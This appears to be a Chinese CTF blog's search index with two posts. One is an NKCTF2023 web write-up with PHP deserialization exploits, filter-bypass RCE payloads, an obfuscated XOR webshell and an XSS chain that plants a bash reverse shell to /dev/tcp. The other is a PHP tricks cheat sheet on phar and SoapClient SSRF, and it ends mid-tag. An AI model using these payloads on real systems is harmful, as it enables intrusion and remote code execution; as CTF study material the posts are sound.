<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>NKCTF2023 WEB</title>
      <link href="/2023/03/27/nkctf2023-web/"/>
      <url>/2023/03/27/nkctf2023-web/</url>
      
        <content type="html"><![CDATA[<h3 id="tl-dr"><a href="#tl-dr" class="headerlink" title="tl;dr"></a>tl;dr</h3><p>为什么全是php</p><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="baby-php"><a href="#baby-php" class="headerlink" title="baby_php"></a>baby_php</h4><p>exp</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Welcome</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$arg</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token string">'welcome_to_NKCTF'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Happy</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$shell</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">shell</span><span class="token operator">=</span><span class="token string">"system"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">cmd</span><span class="token operator">=</span><span class="token string">"more /[e-h][1-z][1-b][e-h]"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Hell0</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$func</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">func</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Happy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$w</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Welcome</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$w</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">arg</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Hell0</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$w</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="eazy-php"><a href="#eazy-php" class="headerlink" title="eazy_php"></a>eazy_php</h4><ol><li><p>弱比较md5，没转string，数组绕过 ?a[]&#x3D;1&amp;b[]&#x3D;2</p></li><li><p>强转string并且是强比较，随便搜一搜就能搜到（用burp传</p></li><li><p>e&#x3D;114514.1</p></li><li><p>php解析错误，会把[解析成_并且后面的符号不处理：NS[CTF.go</p></li><li><p>无字母数字RCE，取反绕过即可</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$ans1</span><span class="token operator">=</span><span class="token string">'system'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//函数名</span><span class="token variable">$ans2</span><span class="token operator">=</span><span class="token string">'ls /'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//命令</span><span class="token variable">$data1</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'~'</span><span class="token punctuation">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$ans1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//通过两次取反运算得到system</span><span class="token variable">$data2</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'~'</span><span class="token punctuation">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$ans2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//通过两次取反运算得到dir</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token string">'('</span><span class="token punctuation">.</span><span class="token variable">$data1</span><span class="token punctuation">.</span><span class="token string">')'</span><span class="token punctuation">.</span><span class="token string">'('</span><span class="token punctuation">.</span><span class="token variable">$data2</span><span class="token punctuation">.</span><span class="token string">')'</span><span class="token punctuation">.</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><p>payload:</p><pre class="line-numbers language-http"><code class="language-http">POST /?a[]=1&amp;b[]=2&amp;e=114514.1&amp;NS[CTF.go=1 HTTP/1.1<span class="token header-name keyword">Host:</span> 0e24c0a9-4d3e-4a99-afc9-001ed884b1f0.node2.yuzhian.com.cn<span class="token header-name keyword">Content-Type:</span> application/x-www-form-urlencoded<span class="token header-name keyword">Content-Length:</span> 1342c=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;d=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1&amp;cmd=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%9E%98);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="easy-pms"><a href="#easy-pms" class="headerlink" title="easy_pms"></a>easy_pms</h4><p><a href="https://blog.csdn.net/qq_41904294/article/details/128838423">参考链接</a></p><p>bin目录下貌似缺一些命令，tac &#x2F;flag就可以了。</p><p>tac &#x2F;flag</p><h4 id="hard-php"><a href="#hard-php" class="headerlink" title="hard_php"></a>hard_php</h4><p>常见的取反~，异或^都被过滤，但是[ ]+$可以用，通过自增的方法进行RCE绕过。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//用 ___ 代替 0</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">(</span>_<span class="token operator">/</span>_<span class="token punctuation">.</span>_<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token constant">___</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// NAN 取 N</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// O</span><span class="token variable">$_____</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">.</span><span class="token variable">$__</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// PO</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token operator">/</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">=</span>_<span class="token punctuation">.</span><span class="token variable">$_____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">.</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// _.POST</span>$<span class="token variable">$_</span><span class="token punctuation">[</span><span class="token constant">___</span><span class="token punctuation">]</span><span class="token punctuation">(</span>$<span class="token variable">$_</span><span class="token punctuation">[</span>_<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//$_POST[___]($_POST[_])</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>去掉换行和注释即可,注意url编码。</p><p>查看phpinfo发现disable_function过滤了很多，直接readfile盲打成功。</p><p>payload:</p><pre class="line-numbers language-http"><code class="language-http">NKCTF=%24_%3D(_%2F_._)%5B___%5D%3B%24__%3D%2B%2B%24_%3B%24_____%3D%2B%2B%24_.%24__%3B%2B%2B%24_%2F%2B%2B%24_%3B%24_%3D_.%24_____.%3D%2B%2B%24_.%2B%2B%24_%3B%24%24_%5B___%5D(%24%24_%5B_%5D)%3B&amp;___=readfile&amp;_=/flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="webpagetest"><a href="#webpagetest" class="headerlink" title="webpagetest"></a>webpagetest</h4><p>又是phar，直接复现就完事儿了。</p><p><a href="https://xz.aliyun.com/t/11798">传送门</a></p><p>因为是用新买的笔记本打的，php环境啥的都没装。修改phar.readonly浪费了俩小时的时间，尼玛php.ini的优先级竟然不是最高的。</p><h4 id="easy-cms"><a href="#easy-cms" class="headerlink" title="easy_cms"></a>easy_cms</h4><p>笑嘻了。环境一开始不是这样的，弱口令也不是admin。后来再开了一遍发现环境变了，访问&#x2F;dede，admin&#x2F;admin登录后台。</p><p>检索的过程中竟然发现有后台RCE漏洞，我寻思你都最高权限进后台了，直接进系统设置-&gt;其它设置把过滤的东西删了，然后进入附件设置，设置允许传入php。</p><p>有个检测一句话的waf，免杀一句话很多，随便搞一个传上去即可。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> $<span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">63</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">96</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">62</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">43</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>$<span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">46</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">126</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">96</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">46</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">125</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">43</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span>    <span class="token comment" spellcheck="true">// ?k=system        POST:k=cat /f1Aggg </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="xiaopi"><a href="#xiaopi" class="headerlink" title="xiaopi"></a>xiaopi</h4><p>访问404，群主说不需要爆破扫描，那就本地开一个小皮看一看到底有什么不一样。</p><p>小皮日志xss RCE，登录请求会被日志记录下来，加载页面会读取日志并且渲染出来，而小皮后台可以写定时任务，因此我们只要引入一个恶意xss，admin登陆进去触发xss，写入定时任务即可RCE。</p><p>后来发现少一个请求头X-Requested-With，添加上就可以了。</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1679900305410.png" alt="1679900305410" style="zoom: 33%;" /><p>经过一番测试发现不是弱口令，但题目说：之后的每一天还总是登录到后台去部署服务。因此我们只要引入一个xss就好了。</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">poc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  $<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/service/app/tasks.php?type=task_list'</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> id<span class="token operator">=</span>data<span class="token punctuation">.</span>data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ID<span class="token punctuation">;</span>    $<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/service/app/tasks.php?type=exec_task'</span><span class="token punctuation">,</span><span class="token punctuation">{</span>      tid<span class="token punctuation">:</span>id    <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span>res2<span class="token punctuation">)</span><span class="token punctuation">{</span>        $<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/service/app/log.php?type=clearlog'</span><span class="token punctuation">,</span><span class="token punctuation">{</span>                    <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span>res3<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token string">"json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token string">"json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token string">"json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">var</span> data<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  data<span class="token punctuation">.</span>task_id<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span>  data<span class="token punctuation">.</span>title<span class="token operator">=</span><span class="token string">"test"</span><span class="token punctuation">;</span>  data<span class="token punctuation">.</span>exec_cycle<span class="token operator">=</span><span class="token string">"1"</span><span class="token punctuation">;</span>  data<span class="token punctuation">.</span>week<span class="token operator">=</span><span class="token string">"1"</span><span class="token punctuation">;</span>  data<span class="token punctuation">.</span>day<span class="token operator">=</span><span class="token string">"3"</span><span class="token punctuation">;</span>  data<span class="token punctuation">.</span>hour<span class="token operator">=</span><span class="token string">"15"</span><span class="token punctuation">;</span>  data<span class="token punctuation">.</span>minute <span class="token operator">=</span> <span class="token string">"40"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//定时任务时间设置要对</span>  data<span class="token punctuation">.</span>shell<span class="token operator">=</span><span class="token string">'bash -i >&amp; /dev/tcp/x.x.x.x/330 0>&amp;1'</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//问了一下汪汪队师傅，傻逼了忘记有弹shell这个操作了，看来还是得经常打比赛。</span>  $<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/service/app/tasks.php?type=save_shell'</span><span class="token punctuation">,</span>data<span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">poc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token string">'json'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>除了密码学其他方向应该都不难捏。</p><p>和乙组的师傅临时组的夕阳红队伍，水平应该在乙组初级~中级这个区间。比赛的时候师兄边准备开题报告边re，我们也要写作业忙科研项目，在这个时间节点能在一起讨论比赛提升技术真是太好了。希望以后每个月都能打一场捏。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP的一些trick</title>
      <link href="/2023/01/16/php-fan-xu-lie-de-yi-xie-trick/"/>
      <url>/2023/01/16/php-fan-xu-lie-de-yi-xie-trick/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP的一些trick"><a href="#PHP的一些trick" class="headerlink" title="PHP的一些trick"></a>PHP的一些trick</h1><blockquote><p>会长期更新的系列，自用。</p></blockquote><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><h4 id="Magic-method"><a href="#Magic-method" class="headerlink" title="Magic method"></a>Magic method</h4><ul><li>构造函数 <code>__construct</code> 对象被创建的时候调用</li><li>析构函数 <code>__destruct</code> 对象被销毁的时候调用</li><li>方法重载 <code>__call</code> 在对象中调用一个不可访问方法时调用</li><li>方法重载 <code>__callStatic</code> 在静态上下文中调用一个不可访问方法时调用</li><li>在给不可访问属性赋值时，<code>__set()</code> 会被调用。</li><li>读取不可访问属性的值时，<code>__get()</code> 会被调用。</li><li>当对不可访问属性调用 <code>isset()</code> 或 <code>empty()</code> 时，<code>__isset()</code> 会被调用</li><li>当对不可访问属性调用 <code>unset()</code> 时，<code>__unset()</code> 会被调用</li><li><code>__sleep()</code> 在<code>serialize()</code> 函数执行之前调用</li><li><code>__wakeup()</code> 在<code>unserialize()</code> 函数执行之前调用</li><li><code>__toString</code> 在一个类被当成字符串时被调用（不仅仅是echo的时候,比如file_exists()判断也会触发</li></ul><h4 id="Primitive-class"><a href="#Primitive-class" class="headerlink" title="Primitive class"></a>Primitive class</h4><p><strong>读文件名：</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">echo</span> <span class="token keyword">new</span> <span class="token class-name">GlobIterator</span><span class="token punctuation">(</span><span class="token string">'/f*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span>'glob<span class="token punctuation">:</span><span class="token comment" spellcheck="true">///f*');</span><span class="token keyword">echo</span> <span class="token keyword">new</span> <span class="token class-name">FilesystemIterator</span><span class="token punctuation">(</span>'glob<span class="token punctuation">:</span><span class="token comment" spellcheck="true">///f*');</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>读文件：</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">echo</span> <span class="token keyword">new</span> <span class="token class-name">SplFileObject</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="phar"><a href="#phar" class="headerlink" title="phar"></a>phar</h4><blockquote><p>没有unserialize()时或许可以通过phar进行反序列化。</p></blockquote><p><strong>触发phar的函数：</strong></p><table><thead><tr><th>能够利用的函数</th><th></th><th></th><th></th></tr></thead><tbody><tr><td>fileatime</td><td>filectime</td><td>file_exists</td><td>file_get_contents</td></tr><tr><td>file_put_contents</td><td>file</td><td>filegroup</td><td>fopen</td></tr><tr><td>fileinode</td><td>filemtime</td><td>fileowner</td><td>fileperms</td></tr><tr><td>is_dir</td><td>is_executable</td><td>is_file</td><td>is_link</td></tr><tr><td>is_readable</td><td>is_writable</td><td>is_writeable</td><td>parse_ini_file</td></tr><tr><td>copy</td><td>unlink</td><td>stat</td><td>readfile</td></tr></tbody></table><p><strong>利用phar的条件：</strong></p><p>1）phar文件要能够上传至服务器</p><p>2）要有可用的魔术方法为跳板</p><p>3）文件操作函数的参数可控，且 : 、 &#x2F; 、phar等特殊字符没有被过滤</p><p>4）php版本小于8</p><p><strong>生成phar脚本：</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token keyword">class</span> <span class="token class-name">B</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token keyword">class</span> <span class="token class-name">C</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$user</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//生成phar.phar</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span> <span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"GIF89a&lt;?php __HALT_COMPILER();?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//设置stub，&lt;?php 前的字符无所谓，GIF89a绕过图片头</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//写入metadata</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"exp.txt"</span><span class="token punctuation">,</span><span class="token string">"Squirt1e"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//签名</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="SoapClient-call-反序列化-CRLF打SSRF"><a href="#SoapClient-call-反序列化-CRLF打SSRF" class="headerlink" title="SoapClient::__call+反序列化+CRLF打SSRF"></a>SoapClient::__call+反序列化+CRLF打SSRF</h4><blockquote><p>如果在代码审计中有反序列化点，但在代码中找不到pop链，可以利用php内置类来进行反序列化，SoapClient打SSRF比较常见。</p></blockquote><p>首先测试下正常情况下的<code>SoapClient</code>类，调用一个不存在的函数，会去调用<code>__call</code>方法，那么<code>__call</code>方法会POST一个本地请求从而绕过本机ip校验。</p><p><strong>CRLF注入任意请求头：</strong></p><p>用安洵杯的一道题做示范。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$target</span> <span class="token operator">=</span> "http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//127.0.0.1:5555/flag.php?a=SplFileObject&amp;b=/f1111llllllaagg";</span><span class="token variable">$attack</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SoapClient</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'uri'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"123"</span><span class="token punctuation">,</span><span class="token string">'location'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$target</span><span class="token punctuation">,</span><span class="token string">'user_agent'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"aaaa\r\nCookie: PHPSESSID=123456"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$attack</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token string">"not_exists_function"</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>CRLF就是<code>\r\n</code>在HTTP报文中当换行用。user-agent注入Cookie成功。</p><img 